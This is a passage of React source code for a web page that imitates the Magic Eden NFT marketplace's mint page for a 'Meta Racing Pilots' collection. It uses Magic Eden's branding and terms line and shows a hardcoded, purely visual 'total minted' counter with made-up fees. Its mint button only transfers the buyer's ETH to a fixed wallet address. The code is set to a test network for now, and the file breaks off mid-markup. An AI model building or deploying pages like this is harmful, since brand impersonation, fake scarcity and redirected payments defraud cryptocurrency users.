import { useEffect, useMemo, useState } from "react";
import { BrowserProvider, formatEther, parseEther } from "ethers";

const RECEIVER = "0x8A3F0f3De937Cf08D6A4144e945A354954F878E9";
const PRICE_PER_ITEM_ETH = "0.1";

const SEPOLIA_CHAIN_ID_DEC = 11155111n;
const SEPOLIA_CHAIN_ID_HEX = "0xAA36A7";

// minted UI (визуально)
const TOTAL_MINTED_PERCENT = 15.9;
const TOTAL_MINTED = 239;
const TOTAL_SUPPLY = 1500;

const IMAGES = [
  "/images/nft1.avif",
  "/images/nft2.avif",
  "/images/nft3.avif",
  "/images/nft4.avif",
];

const CSS = `
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

:root{
  --brand: 236 19 109;
  --brand-darker: 201 8 89;

  --textColor-primary: 242 242 243;
  --textColor-secondary: 133 127 148;

  --textColor-positive: 42 223 114;
  --textColor-attention: 236 182 19;
  --textColor-negative: 234 65 65;

  --bg: #100c18;
  --layer-01: #15111d;
  --panel: #1e1929;

  --borderColor-primary: 35 30 47;
  --borderColor-interactive: 71 64 89/60%;
  --borderColor-interactive-hover: 111 104 125/50%;
  --borderColor-interactive-focus: 133 127 148/50%;

  --button-primary: 236 19 109;
  --button-primary-hover: 201 8 89;
  --button-primary-active: 236 19 109;
  --button-primary-disabled: 236 19 109/20%;
  --button-secondary: 62 56 77/60%;
  --button-secondary-hover: 62 56 77/40%;
  --button-secondary-active: 71 64 89/90%;
  --button-secondary-disabled: 62 56 77/30%;

  --text: rgb(var(--textColor-primary));
  --muted: rgb(var(--textColor-secondary) / .82);

  --shadow: 0 18px 60px rgb(0 0 0 / .55);
  --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
  --sans: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;

  --nav-h: 64px;
  --nav-h-m: 48px;

  --nav-pad-x: 18px;
  --nav-pad-x-m: 12px;
  --content-top-gap: 72px;

  --media-radius: 14px;
  --thumb-radius: 12px;
  --media-gap: 12px;
  --thumb-size: 131px;

  /* spacing around search */
  --search-gap-left: 16px;
  --search-gap-right: 16px;
}

*{box-sizing:border-box}
html,body{height:100%}
body{
  margin:0;
  font-family:var(--sans);
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  color:var(--text);
  background:
    radial-gradient(1100px 650px at 50% -10%, rgb(var(--brand) / .10), transparent 60%),
    radial-gradient(900px 550px at 80% 10%, rgb(120 90 255 / .10), transparent 60%),
    linear-gradient(180deg, var(--bg), var(--bg));
}
#root{ width:100%; max-width:none; margin:0; padding:0; }
a{color:inherit; text-decoration:none}
button{font-family:inherit}
.page{min-height:100vh; width:100%;}
button, input { outline: none; }
button:focus, button:focus-visible { outline: none; box-shadow: none; }
input:focus, input:focus-visible { outline: none; box-shadow: none; }

/* ===== NAVBAR ===== */
.header{
  position: sticky;
  top: 0;
  z-index: 300;
  width: 100%;
}
.headerBar{
  height: var(--nav-h);
  min-height: var(--nav-h);
  width: 100%;
  display:flex;
  align-items:center;
  background: rgb(21 17 29 / 1);
  border-bottom: 1px solid rgb(var(--borderColor-primary));
  backdrop-filter: blur(10px);
}
.nav{
  width:100%;
  height: 100%;
  display:flex;
  align-items:center;
  gap: 14px;
  padding: 0 var(--nav-pad-x);
}

/* left group */
.navLeft{
  display:flex;
  align-items:center;
  gap: 18px;
  height:100%;
  flex: 0 0 auto;
}
.logoWrap{
  display:flex;
  align-items:center;
  gap: 10px;
  height:100%;
  flex: 0 0 auto;
}

/* ✅ logo bigger */
.meLogoSvg{
  height: 18px;     /* was 16 */
  width: 190px;     /* was 176 */
  display:block;
}

/* ✅ nav links more spacing + text like buttons */
.navLinks{
  display:flex;
  align-items:center;
  gap: 30px;        /* was 24 */
  height:100%;
}
.navLink{
  font-weight: 800; /* closer to Buybacks/Login */
  font-size: 13px;  /* like buttons */
  opacity: .95;
  cursor: pointer;
  transition: opacity .15s ease;
  white-space: nowrap;
}
.navLink:hover{ opacity: .78; }

/* search takes all free horizontal space */
.navSearch{
  flex: 1;
  min-width: 0;
  display:flex;
  align-items:center;
  padding: 0 var(--search-gap-left) 0 var(--search-gap-right);
}
.searchWrap{
  width: 100%;
  height: 40px;
  display:flex;
  align-items:center;
  border-radius: 8px;
  background: transparent;
  border: 1px solid rgb(var(--borderColor-interactive));
  transition: border-color .15s ease, background .15s ease;
  overflow:hidden;
}
.searchWrap:hover{ border-color: rgb(var(--borderColor-interactive-hover)); }
.searchWrap:focus-within{ border-color: rgb(var(--borderColor-interactive-focus)); }

.searchLeft{
  width: 36px;
  height: 40px;
  display:flex;
  align-items:center;
  justify-content:center;
  opacity: .95;
  flex: 0 0 auto;
  color: rgb(var(--textColor-primary));
}

.searchInput{
  flex: 1;
  height: 40px;
  border: none;
  background: transparent;
  color: rgb(var(--textColor-primary));
  font-size: 13px;
  padding: 0 10px 0 0;
  min-width: 0;
}

/* ✅ Ctrl K: no borders, more right padding, perfectly aligned */
.searchRight{
  height: 40px;
  display:flex;
  align-items:center;
  justify-content:center;
  flex: 0 0 auto;
  padding-right: 12px; /* more space from right edge */
}

.kbd{
  display:flex;
  align-items:center;
  justify-content:center;
  gap: 6px;
  transform: translateY(.5px); /* baseline fix */
}

.kbdKey{
  display:inline-flex;
  align-items:center;
  justify-content:center;
  height: 24px;
  padding: 0 8px;
  border-radius: 8px;
  border: none; /* ✅ no рамок */
  background: rgba(255,255,255,.06);
  color: rgb(var(--textColor-secondary));
  font-weight: 800;
  font-size: 12px;
  line-height: 1;
}

/* right group */
.navRight{
  display:flex;
  align-items:center;
  gap: 10px;
  flex: 0 0 auto;
}

.btnSecondary{
  height: 40px;
  padding: 0 14px;
  border-radius: 8px;
  border: none;
  background: rgb(var(--button-secondary));
  color: rgb(var(--textColor-primary));
  font-weight: 800;
  font-size: 13px;
  cursor: pointer;
  transition: background .12s ease;
  display:inline-flex;
  align-items:center;
  justify-content:center;
  white-space: nowrap;
}
.btnSecondary:hover{ background: rgb(var(--button-secondary-hover)); }
.btnSecondary:active{ background: rgb(var(--button-secondary-active)); }
.btnSecondary:disabled{ background: rgb(var(--button-secondary-disabled)); opacity:.6; cursor:not-allowed; }

.btnPrimary{
  height: 40px;
  padding: 0 16px;
  border-radius: 8px;
  border: none;
  background: rgb(var(--button-primary));
  color: rgb(242 242 243);
  font-weight: 900;
  font-size: 13px;
  cursor:pointer;
  transition: background .12s ease;
  min-width: 120px;
}
.btnPrimary:hover{ background: rgb(var(--button-primary-hover)); }
.btnPrimary:active{ background: rgb(var(--button-primary-active)); }
.btnPrimary:disabled{ background: rgb(var(--button-primary-disabled)); cursor:not-allowed; }

.iconBtn{
  width: 40px;
  height: 40px;
  border-radius: 8px;
  border: none;
  background: rgb(var(--button-secondary));
  color: rgb(var(--textColor-primary));
  display:flex;
  align-items:center;
  justify-content:center;
  cursor:pointer;
  transition: background .12s ease;
}
.iconBtn:hover{ background: rgb(var(--button-secondary-hover)); }
.iconBtn:active{ background: rgb(var(--button-secondary-active)); }

.mobileOnly{ display:none; }
.desktopOnly{ display:flex; }

.mobileMenu{
  width: 100%;
  background: rgb(21 17 29 / 1);
  border-bottom: 1px solid rgb(var(--borderColor-primary));
  padding: 10px var(--nav-pad-x-m) 14px;
}
.mobileItem{
  width: 100%;
  height: 42px;
  border-radius: 10px;
  border: none;
  background: rgb(var(--button-secondary));
  color: rgb(var(--textColor-primary));
  font-weight: 800;
  padding: 0 12px;
  display:flex;
  align-items:center;
  justify-content:flex-start;
  margin-top: 8px;
}
.mobileItem:hover{ background: rgb(var(--button-secondary-hover)); }

/* ===== Layout ===== */
.shell{
  max-width: 1240px;
  margin: 0 auto;
  padding: var(--content-top-gap) 18px 44px;
}

.topRow{
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap: 12px;
}
.topLeft{
  display:flex;
  align-items:center;
  gap: 12px;
  min-width: 0;
}
.chainBadge{
  font-weight: 800;
  font-size: 12px;
  color: rgb(121 192 255);
  opacity: .85;
  letter-spacing: .6px;
}
.title{
  font-size: 34px;
  font-weight: 900;
  letter-spacing: .2px;
  line-height: 1.1;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

.mainGrid{
  display:grid;
  grid-template-columns: 1.1fr .9fr;
  gap: 22px;
  align-items:start;
}

/* ===== MEDIA ===== */
.mediaCard{ background: transparent; border: none; box-shadow: none; border-radius: 0; overflow: visible; }
.mediaWrap{ width: 580px; max-width: 100%; margin: 0 auto; }
.mediaMain{
  position: relative;
  width: 100%;
  height: 580px;
  display:flex;
  align-items:center;
  justify-content:center;
}
.mainImg{
  width: 100%;
  height: 580px;
  object-fit: contain;
  object-position: center;
  background: transparent;
  border: none;
  border-radius: var(--media-radius);
}
.fullscreen{
  position:absolute;
  right: 14px;
  top: 14px;
  width: 38px;
  height: 38px;
  display:flex;
  align-items:center;
  justify-content:center;
  border-radius: 8px;
  border: 1px solid rgb(var(--borderColor-interactive));
  background: rgba(255,255,255,.06);
  color: rgba(236,234,247,.9);
}

/* thumbs 131x131 filled */
.thumbRow{
  width: 100%;
  display:grid;
  grid-template-columns: repeat(4, var(--thumb-size));
  justify-content: space-between;
  gap: var(--media-gap);
  margin-top: var(--media-gap);
  padding: 0;
  overflow: hidden;
}
.thumbBtn{
  width: var(--thumb-size);
  height: var(--thumb-size);
  border-radius: var(--thumb-radius);
  border: none;
  background: transparent;
  padding: 0;
  overflow: hidden;
  cursor: pointer;
  opacity: .85;
  transition: filter .12s ease, opacity .12s ease, outline-color .12s ease;
}
.thumbBtn:hover{ filter: brightness(.92); }
.thumbBtn.active{
  outline: 2px solid rgb(var(--brand));
  opacity: 1;
}
.thumbImg{
  width: 100%;
  height: 100%;
  display:block;
  border-radius: var(--thumb-radius);
  object-fit: cover;
  object-position: center;
}

/* panel */
.panel{
  background: var(--panel);
  border: 1px solid rgb(var(--borderColor-primary));
  border-radius: 16px;
  box-shadow: var(--shadow);
  overflow:hidden;
}
.panelInner{ padding: 18px; }

.metaRow{
  display:flex;
  align-items:flex-start;
  justify-content:space-between;
  gap: 12px;
  margin-bottom: 12px;
}
.metaLeft{ display:flex; flex-direction:column; gap: 10px; }
.metaLine{ display:flex; align-items:center; gap: 12px; flex-wrap: nowrap; }

.eligPill{
  display:inline-flex;
  align-items:center;
  gap: 8px;
  height: 30px;
  padding: 0 10px;
  border-radius: 10px;
  border: 1px solid rgb(var(--borderColor-interactive));
  background: transparent;
  color: rgba(242,242,243,.92);
  font-weight: 900;
  font-size: 13px;
  white-space: nowrap;
}
.lockIcon{ font-size: 13px; opacity: .9; }
.publicRow{
  display:flex;
  align-items:center;
  gap: 8px;
  color: rgba(242,242,243,.72);
  font-size: 13px;
  font-weight: 900;
  white-space: nowrap;
}
.greenDot{
  width: 8px;
  height: 8px;
  border-radius: 999px;
  background: rgb(var(--textColor-positive));
  box-shadow: 0 0 10px rgb(var(--textColor-positive) / .18);
}

.mintedBox{
  min-width: 240px;
  display:flex;
  flex-direction:column;
  align-items:stretch;
  gap: 8px;
}
.mintedHeader{
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap: 10px;
}
.mintedTop{
  font-size: 12px;
  color: rgba(133,127,148,.90);
  font-weight: 600;
}
.mintedNums{
  font-size: 12px;
  color: rgba(242,242,243,.86);
  font-weight: 900;
  white-space: nowrap;
}
.mintedBar{
  width: 100%;
  height: 6px;
  border-radius: 999px;
  background: rgba(255,255,255,.10);
  overflow:hidden;
}
.mintedFill{
  height: 100%;
  width: var(--pct, 0%);
  background: rgb(var(--brand));
  border-radius: 999px;
}

.rowTop{
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap: 14px;
  margin-top: 10px;
}
.priceBlock .label{
  font-size: 14px;
  color: rgba(242,242,243,.76);
  font-weight: 900;
}
.priceBlock .priceLine{
  display:flex;
  align-items:baseline;
  gap: 10px;
  margin-top: 6px;
}
.priceBig{ font-size: 28px; font-weight: 900; }
.usd{ font-size: 13px; color: rgba(133,127,148,.90); font-weight: 700; }

.stepper{
  display:flex;
  align-items:center;
  justify-content:space-between;
  height: 40px;
  padding: 0 6px;
  border-radius: 10px;
  background: rgb(var(--button-secondary));
  border: none;
  min-width: 150px;
}
.stepBtn{
  width: 40px;
  height: 40px;
  display:flex;
  align-items:center;
  justify-content:center;
  border-radius: 10px;
  border: none;
  background: transparent;
  color: var(--text);
  font-size: 18px;
  line-height: 1;
  padding: 0;
  cursor:pointer;
  transition: background .12s ease;
}
.stepBtn:hover{ background: rgb(var(--button-secondary-hover)); }
.stepBtn:disabled{opacity:.35; cursor:not-allowed; background: transparent;}
.stepVal{
  flex: 1;
  height: 40px;
  display:flex;
  align-items:center;
  justify-content:center;
  text-align:center;
  font-weight: 900;
  line-height: 1;
}

.fees{
  margin-top: 12px;
  display:grid;
  grid-template-columns: 1fr auto;
  gap: 8px 12px;
  color: rgba(242,242,243,.72);
  font-size: 12px;
}
.fees .r{ text-align:right; font-weight: 900; color: rgba(242,242,243,.82); }
.smallLink{ color: rgba(133,127,148,.90); text-decoration: underline; cursor: default; }

.terms{
  margin-top: 14px;
  display:flex;
  gap: 10px;
  align-items:flex-start;
  color: rgba(133,127,148,.90);
  font-size: 12px;
  line-height: 1.35;
}
.cb{
  appearance: none;
  -webkit-appearance: none;
  width: 18px;
  height: 18px;
  border-radius: 8px;
  border: none;
  background: rgb(var(--button-secondary));
  display:inline-grid;
  place-items:center;
  margin-top: 2px;
  cursor: pointer;
  transition: background .12s ease;
}
.cb:hover{ background: rgb(var(--button-secondary-hover)); }
.cb:checked::after{
  content: "✓";
  font-size: 14px;
  font-weight: 900;
  color: rgba(242,242,243,.92);
  transform: translateY(-0.5px);
}

.primaryCta{
  margin-top: 14px;
  width: 100%;
  padding: 13px 14px;
  border-radius: 12px;
  border: none;
  background: rgb(var(--button-primary));
  color: rgba(242,242,243,1);
  font-weight: 900;
  cursor:pointer;
  transition: background .12s ease;
}
.primaryCta:hover{ background: rgb(var(--button-primary-hover)); }
.primaryCta:disabled{opacity:.55; cursor:not-allowed}
.primaryCta.notBold{ font-weight: 800; }

.noticeLock{
  margin-top: 12px;
  padding: 12px 12px;
  border-radius: 12px;
  background: rgba(0,0,0,.18);
  border: 1px solid rgb(var(--borderColor-primary));
  color: rgba(242,242,243,.72);
  font-size: 12px;
  display:flex;
  gap:10px;
  align-items:center;
}
.txBox{
  margin-top: 12px;
  padding: 12px;
  border-radius: 12px;
  border: 1px solid rgb(var(--borderColor-primary));
  background: rgba(255,255,255,.04);
  font-size: 12px;
  color: rgba(242,242,243,.72);
}
.txBox a{
  display:inline-block;
  margin-top: 8px;
  color: rgba(154, 215, 255, .95);
  font-weight: 900;
}
.err{
  margin-top: 12px;
  padding: 12px;
  border-radius: 12px;
  border: 1px solid rgba(234, 65, 65, .35);
  background: rgba(234, 65, 65, .12);
  color: rgba(255, 220, 220, .95);
  font-size: 12px;
}

/* Responsive */
@media (max-width: 1050px){
  .mainGrid{ grid-template-columns: 1fr; }
  .mediaWrap{ width: 520px; }
  .mediaMain{ height: 520px; }
  .mainImg{ height: 520px; }
  :root{ --thumb-size: 118px; }
}

@media (max-width: 860px){
  .headerBar{ height: var(--nav-h-m); min-height: var(--nav-h-m); }
  .nav{ padding: 0 var(--nav-pad-x-m); }
  .navLinks{ display:none; }
  .navSearch{ display:none; }
  .desktopOnly{ display:none; }
  .mobileOnly{ display:flex; }
  :root{ --content-top-gap: 56px; --thumb-size: 96px; }

  .mediaWrap{ width: 420px; }
  .mediaMain{ height: 420px; }
  .mainImg{ height: 420px; }
}

@media (max-width: 640px){
  :root{ --thumb-size: 72px; }
  .mediaWrap{ width: 320px; }
  .mediaMain{ height: 340px; }
  .mainImg{ height: 320px; }
  .title{ font-size: 24px; }
  .mintedBox{ min-width: 200px; }
}
`;

function shortAddr(a) {
  if (!a) return "";
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

function SearchIcon() {
  return (
    <svg viewBox="0 0 21 20" fill="none" width="20" height="20" aria-hidden="true">
      <path
        d="M9.86686 15.8333C13.5488 15.8333 16.5335 12.8486 16.5335 9.16667C16.5335 5.48477 13.5488 2.5 9.86686 2.5C6.18496 2.5 3.2002 5.48477 3.2002 9.16667C3.2002 12.8486 6.18496 15.8333 9.86686 15.8333Z"
        stroke="currentColor"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
      <path
        d="M18.2002 17.5L14.5752 13.875"
        stroke="currentColor"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
    </svg>
  );
}

function MagicEdenLogo() {
  return (
    <svg
      viewBox="0 0 176 20"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
      className="meLogoSvg"
      aria-label="Magic Eden"
      role="img"
    >
      <path
        d="M23.5949 5.09192L25.5453 7.38358C25.7686 7.64098 25.9666 7.85271 26.0467 7.97311C26.63 8.55281 26.957 9.33628 26.9566 10.1527C26.9018 11.1158 26.2741 11.7718 25.6928 12.4734L24.3279 14.0759L23.616 14.9062C23.5904 14.9349 23.574 14.9702 23.5686 15.008C23.5632 15.0458 23.5692 15.0842 23.5858 15.1187C23.6024 15.1531 23.6288 15.182 23.6619 15.2018C23.695 15.2216 23.7332 15.2314 23.7718 15.2301H30.887C31.9738 15.2301 33.3429 16.1434 33.2629 17.53C33.2607 18.1603 33.0056 18.7641 32.5534 19.2097C32.1012 19.6554 31.4885 19.9067 30.849 19.9089H19.7067C18.9737 19.9089 17.0021 19.9878 16.4503 18.3064C16.3329 17.955 16.3169 17.5785 16.404 17.2187C16.5644 16.6866 16.8181 16.1864 17.1538 15.7407C17.7141 14.9104 18.3207 14.0801 18.9189 13.2747C19.6898 12.2202 20.4818 11.1989 21.2611 10.1236C21.2888 10.0886 21.3038 10.0455 21.3038 10.0011C21.3038 9.95678 21.2888 9.91368 21.2611 9.87868L18.4302 6.55742C18.4118 6.53334 18.3879 6.51381 18.3605 6.50037C18.3331 6.48692 18.3029 6.47992 18.2723 6.47992C18.2416 6.47992 18.2114 6.48692 18.184 6.50037C18.1566 6.51381 18.1327 6.53334 18.1143 6.55742C17.356 7.56625 14.0365 12.0333 13.3287 12.9384C12.621 13.8434 10.877 13.8932 9.9123 12.9384L5.48484 8.55848C5.45655 8.53051 5.42048 8.51145 5.38119 8.50372C5.3419 8.49599 5.30117 8.49994 5.26416 8.51506C5.22715 8.53019 5.19553 8.5558 5.17332 8.58866C5.15111 8.62152 5.1393 8.66015 5.1394 8.69963V17.1232C5.14982 17.7209 4.97021 18.3069 4.62573 18.799C4.28125 19.2911 3.78917 19.6647 3.21844 19.8674C2.85377 19.9924 2.46403 20.0298 2.08173 19.9763C1.69943 19.9228 1.33565 19.78 1.02071 19.5598C0.70578 19.3396 0.448823 19.0484 0.271268 18.7105C0.0937132 18.3726 0.000705322 17.9977 0 17.6172V2.47228C0.0253814 1.92649 0.224654 1.40247 0.569503 0.974675C0.914352 0.546881 1.38723 0.237072 1.92096 0.0892728C2.37877 -0.0309286 2.8607 -0.0297259 3.31789 0.0927586C3.77508 0.215243 4.1913 0.454656 4.52436 0.786737L11.332 7.50398C11.3523 7.52438 11.377 7.54012 11.4042 7.55008C11.4315 7.56003 11.4606 7.56396 11.4895 7.56158C11.5185 7.55921 11.5465 7.55058 11.5717 7.53632C11.5969 7.52206 11.6186 7.50252 11.6353 7.47907L16.4714 0.882224C16.6948 0.614417 16.975 0.397995 17.2923 0.248114C17.6096 0.0982325 17.9562 0.0185155 18.3081 0.0145452H30.887C31.2312 0.0151045 31.5714 0.0880957 31.8847 0.228638C32.198 0.369181 32.4773 0.574035 32.7038 0.829499C32.9303 1.08496 33.0988 1.38515 33.1982 1.70998C33.2975 2.03481 33.3253 2.37679 33.2797 2.71307C33.1911 3.2964 32.8908 3.82825 32.4345 4.20997C31.9782 4.59169 31.3969 4.79737 30.7985 4.78885H23.755C23.7196 4.7897 23.6851 4.79989 23.655 4.81835C23.625 4.83681 23.6005 4.86287 23.5842 4.89382C23.5678 4.92477 23.5602 4.95947 23.5621 4.99431C23.564 5.02915 23.5753 5.06286 23.5949 5.09192Z"
        fill="rgb(var(--brand))"
      />
      <text
        x="40"
        y="14"
        fill="rgb(var(--textColor-primary))"
        fontFamily="Inter, sans-serif"
        fontWeight="800"
        fontSize="12"
        letterSpacing=".2"
      >
        MAGIC EDEN
      </text>
    </svg>
  );
}

export default function App() {
  const [account, setAccount] = useState(null);
  const [qty, setQty] = useState(1);
  const [txHash, setTxHash] = useState(null);
  const [error, setError] = useState(null);
  const [status, setStatus] = useState("idle"); // idle | sending | success
  const [chainId, setChainId] = useState(null);
  const [accepted, setAccepted] = useState(false);
  const [activeThumb, setActiveThumb] = useState(0);
  const [menuOpen, setMenuOpen] = useState(false);

  const itemWei = useMemo(() => parseEther(PRICE_PER_ITEM_ETH), []);
  const totalWei = useMemo(() => itemWei * BigInt(qty), [itemWei, qty]);

  const eligible = !!account;

  const refreshNetwork = async () => {
    try {
      if (!window.ethereum) return;
      const provider = new BrowserProvider(window.ethereum);
      const net = await provider.getNetwork();
      setChainId(net.chainId);
    } catch {}
  };

  useEffect(() => {
    const init = async () => {
      if (!window.ethereum) return;
      try {
        const provider = new BrowserProvider(window.ethereum);
        const net = await provider.getNetwork();
        setChainId(net.chainId);

        const accs = await provider.send("eth_accounts", []);
        if (accs?.[0]) setAccount(accs[0]);
      } catch {}
    };
    init();
  }, []);

  useEffect(() => {
    if (!window.ethereum) return;

    const onChainChanged = () => refreshNetwork();
    const onAccountsChanged = (accs) => setAccount(accs?.[0] ?? null);

    window.ethereum.on?.("chainChanged", onChainChanged);
    window.ethereum.on?.("accountsChanged", onAccountsChanged);

    return () => {
      window.ethereum.removeListener?.("chainChanged", onChainChanged);
      window.ethereum.removeListener?.("accountsChanged", onAccountsChanged);
    };
  }, []);

  const connect = async () => {
    try {
      setError(null);
      setTxHash(null);

      if (!window.ethereum) {
        throw new Error(
          "Wallet не найден. Открой в браузере с MetaMask (не во встроенном preview) и установи расширение."
        );
      }

      const provider = new BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      setAccount(await signer.getAddress());

      const net = await provider.getNetwork();
      setChainId(net.chainId);
    } catch (e) {
      setError(e?.message ?? String(e));
    }
  };

  const switchToSepolia = async () => {
    try {
      setError(null);
      if (!window.ethereum) throw new Error("Wallet не найден.");

      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: SEPOLIA_CHAIN_ID_HEX }],
        });
      } catch (switchError) {
        if (switchError?.code === 4902) {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: SEPOLIA_CHAIN_ID_HEX,
                chainName: "Sepolia",
                nativeCurrency: { name: "SepoliaETH", symbol: "ETH", decimals: 18 },
                rpcUrls: ["https://ethereum-sepolia-rpc.publicnode.com"],
                blockExplorerUrls: ["https://sepolia.etherscan.io"],
              },
            ],
          });
        } else {
          throw switchError;
        }
      }
      await refreshNetwork();
    } catch (e) {
      setError(e?.message ?? String(e));
    }
  };

  const buy = async () => {
    try {
      setError(null);
      setTxHash(null);
      setStatus("idle");

      if (!window.ethereum) throw new Error("Wallet не найден.");
      if (!account) throw new Error("Сначала нажми Log In.");
      if (!accepted) throw new Error("Нужно принять Terms (checkbox).");

      const provider = new BrowserProvider(window.ethereum);
      const network = await provider.getNetwork();
      setChainId(network.chainId);

      if (network.chainId !== SEPOLIA_CHAIN_ID_DEC) {
        throw new Error("Неверная сеть. Переключись на Sepolia (тест).");
      }

      const signer = await provider.getSigner();

      setStatus("sending");
      const tx = await signer.sendTransaction({
        to: RECEIVER,
        value: totalWei,
        gasLimit: 21000n,
      });

      setTxHash(tx.hash);
      await tx.wait();
      setStatus("success");
    } catch (e) {
      setStatus("idle");
      setError(e?.shortMessage ?? e?.message ?? String(e));
    }
  };

  const isSepolia = chainId === SEPOLIA_CHAIN_ID_DEC;

  const mintFeeEth = useMemo(() => (0.003 * (Number(qty) || 0)).toFixed(3), [qty]);
  const protocolFeeEth = useMemo(() => (0.0014 * (Number(qty) || 0)).toFixed(4), [qty]);

  const canMint = !!account && isSepolia && accepted && status !== "sending";

  return (
    <div className="page">
      <style>{CSS}</style>

      {/* NAVBAR */}
      <div className="header" id="header">
        <header className="headerBar">
          <nav className="nav" id="nav">
            <div className="navLeft">
              <a className="logoWrap" href="#" aria-label="Magic Eden">
                <MagicEdenLogo />
              </a>

              <div className="navLinks" aria-label="Primary navigation">
                <span className="navLink">Play</span>
                <span className="navLink">Trade</span>
                <span className="navLink">Mint</span>
              </div>
            </div>

            <div className="navSearch">
              <div className="searchWrap" role="search">
                <div className="searchLeft" aria-hidden="true">
                  <SearchIcon />
                </div>
                <input className="searchInput" placeholder="Search collections" />
                <div className="searchRight" aria-hidden="true">
                  <div className="kbd">
                    <span className="kbdKey">Ctrl</span>
                    <span className="kbdKey">K</span>
                  </div>
                </div>
              </div>
            </div>

            <div className="navRight">
              <button className="iconBtn mobileOnly" aria-label="Search">
                <SearchIcon />
              </button>

              <div className="desktopOnly" style={{ gap: 10, display: "flex" }}>
                <button className="btnSecondary">Buybacks</button>
                <button className="btnSecondary">Rewards</button>
              </div>

              <button className="btnPrimary" onClick={connect}>
                {account ? shortAddr(account) : "Log In"}
              </button>

              <button
                className="iconBtn mobileOnly"
                onClick={() => setMenuOpen((v) => !v)}
                aria-label="Menu"
                title="Menu"
              >
                ☰
              </button>
            </div>
          </nav>
        </header>

        {menuOpen && (
          <div className="mobileMenu">
            <button className="mobileItem">Play</button>
            <button className="mobileItem">Trade</button>
            <button className="mobileItem">Mint</button>
            <button className="mobileItem">Buybacks</button>
            <button className="mobileItem">Rewards</button>
          </div>
        )}
      </div>

      <div className="shell">
        <div className="mainGrid" style={{ alignItems: "start" }}>
          {/* LEFT TOP: title */}
          <div className="topRow" style={{ margin: 0, justifyContent: "flex-start" }}>
            <div className="topLeft">
              <div className="chainBadge">ETH</div>
              <div className="title">Meta Racing Pilots</div>
            </div>
          </div>

          {/* RIGHT TOP: Contract + icons */}
          <div className="topRow" style={{ margin: 0 }}>
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <button className="btnSecondary" style={{ height: 44, borderRadius: 10 }}>
                Contract
              </button>
            </div>
            <div style={{ display: "flex", gap: 12 }}>
              <button className="iconBtn" title="Website">
                🌐
              </button>
              <button className="iconBtn" title="X">
                X
              </button>
              <button className="iconBtn" title="Discord">
                DS
              </button>
            </div>
          </div>

          {/* LEFT: media */}
          <div className="mediaCard" style={{ marginTop: 6 }}>
            <div className="mediaWrap">
              <div className="mediaMain">
                <img src={IMAGES[activeThumb]} alt="Preview" className="mainImg" />
                <div className="fullscreen" title="Fullscreen">
                  ⤢
                </div>
              </div>

              <div className="thumbRow">
                {IMAGES.map((src, i) => (
                  <button
                    key={src}
                    type="button"
                    className={`thumbBtn ${activeThumb === i ? "active" : ""}`}
                    onClick={() => setActiveThumb(i)}
                    title="Preview"
                  >
                    <img src={src} alt={`Thumb ${i + 1}`} className="thumbImg" />
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* RIGHT: panel */}
          <div className="rightCol" style={{ marginTop: 6 }}>
            <div className="panel">
              <div className="panelInner">
                <div className="metaRow">
                  <div className="metaLeft">
                    <div className="metaLine">
                      <div className="eligPill">
                        {!eligible && <span className="lockIcon">🔒</span>}
                        {eligible ? "Eligible" : "Not Eligible"}
                      </div>

                      <div className="publicRow">
                        <span className="greenDot" />
                        <span>Public</span>
                      </div>
                    </div>
                  </div>

                  <div className="mintedBox">
                    <div className="mintedHeader">
                      <div className="mintedTop">Total minted</div>
                      <div className="mintedNums">
                        {TOTAL_MINTED_PERCENT}%&nbsp;&nbsp; {TOTAL_MINTED} / {TOTAL_SUPPLY}
                      </div>
                    </div>

                    <div
                      className="mintedBar"
                      aria-label="minted progress"
                      style={{ ["--pct"]: `${TOTAL_MINTED_PERCENT}%` }}
                    >
                      <div className="mintedFill" />
                    </div>
                  </div>
                </div>

                <div className="rowTop">
                  <div className="priceBlock">
                    <div className="label">Price</div>
                    <div className="priceLine">
                      <div className="priceBig">{PRICE_PER_ITEM_ETH} ETH</div>
                      <div className="usd">(test)</div>
                    </div>
                  </div>

                  <div className="stepper">
                    <button
                      className="stepBtn"
                      onClick={() => setQty((v) => Math.max(1, Number(v) - 1))}
                      disabled={qty <= 1}
                      aria-label="decrease"
                    >
                      −
                    </button>
                    <div className="stepVal">{qty}</div>
                    <button
                      className="stepBtn"
                      onClick={() => setQty((v) => Math.min(20, Number(v) + 1))}
                      disabled={qty >= 20}
                      aria-label="increase"
                    >
                      +
                    </button>
                  </div>
                </div>

                <div className="fees">
                  <div>Mint fee</div>
                  <div className="r">{mintFeeEth} ETH</div>

                  <div>Protocol fee</div>
                  <div className="r">{protocolFeeEth} ETH</div>

                  <div>
                    Priority fee <span className="smallLink">(Standard)</span>
                  </div>
                  <div className="r">—</div>

                  <div style={{ marginTop: 6, color: "rgb(var(--textColor-secondary) / .85)" }}>
                    Subtotal
                  </div>
                  <div style={{ marginTop: 6 }} className="r">
                    {formatEther(totalWei)} ETH
                  </div>
                </div>

                <div className="terms">
                  <input
                    className="cb"
                    type="checkbox"
                    checked={accepted}
                    onChange={(e) => setAccepted(e.target.checked)}
                  />
                  <div>
                    By clicking "mint", you agree to the Magic Eden Terms of Service.
                    <div style={{ marginTop: 6, color: "rgb(var(--textColor-secondary) / .85)" }}>
                      Network:{" "}
                      {isSepolia ? (
                        <b style={{ color: "rgb(var(--textColor-primary) / .92)" }}>Sepolia</b>
                      ) : (
                        <b style={{ color: "rgb(var(--textColor-attention))" }}>
                          Wrong / Not Sepolia
                        </b>
